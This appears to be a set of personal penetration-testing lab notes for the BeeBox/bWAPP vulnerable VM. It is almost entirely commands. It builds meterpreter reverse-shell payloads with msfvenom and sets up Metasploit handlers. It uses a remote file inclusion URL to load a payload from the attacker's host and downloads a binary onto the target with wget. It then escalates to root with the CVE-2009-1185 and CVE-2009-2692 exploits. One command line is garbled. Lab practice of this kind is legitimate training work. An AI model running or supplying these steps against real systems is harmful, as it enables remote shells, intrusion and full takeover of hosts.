###BeeBox

"/multi/handler" can be used for txt file reverse shell

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.112.4 LPORT=4446 -f raw -o /var/www/html/evil.txt
msfconsole 
use exploit/multi/handler
set LPORT 4446
set LHOST 192.168.112.4
set PAYLOAD php/meterpreter_reverse_tcp
run

***Remote & Local File Inclusion (RFI/LFI)***

http://192.168.1.135/bWAPP/rlfi.php?language=lang_en.php&action=go
?language=http://192.168.112.4/evil.txt

python -c 'import pty; pty.spawn("/bin/sh")'
id
whoami

On Kali:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.112.4 LPORT=5000 -f elf -o /var/www/html/run
service apache2 
msfconsole
use exploit/multi/handler
set LHOST 192.168.112.4
set LPORT 5000
set PAYLOAD linux/x86/meterpreter/reverse_tcp

On BeeBox:
wget http://192.168.112.4/run -o /tmp/cd un
gcc cve-2009-1185.c -o /tmp/privescalation
chmod +x /tmp/privescalation
cd /tmp
ps aux | grep udev
./privescalation (PID discovered with grep minus 1 - e.g. 2864 - 1 = 2863)


**Easy Way**
tar -xvf cve-2009-2692.tar
cd cve-2009-2692
sh cve-2009-2692.sh
